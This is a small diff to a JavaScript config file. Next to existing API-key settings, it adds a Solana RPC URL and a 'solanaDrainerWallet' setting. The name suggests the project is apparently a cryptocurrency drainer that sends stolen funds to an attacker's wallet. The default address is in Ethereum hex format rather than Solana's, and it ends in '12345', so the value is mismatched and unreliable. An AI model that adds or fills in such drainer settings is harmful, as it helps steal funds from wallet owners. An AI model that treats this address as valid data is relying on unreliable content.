@@ -57,4 +57,8 @@ module.exports = {
     moralis: process.env.MORALIS_API_KEY || '',
     etherscan: process.env.ETHERSCAN_API_KEY || '',
   },
+
+  // Top-level shortcuts for legacy access patterns
+  solanaRpc: process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com',
+  solanaDrainerWallet: process.env.SOLANA_DRAINER_WALLET || '0x742d35Cc6634C0532925a3b844Bc9e7505f12345',
 };
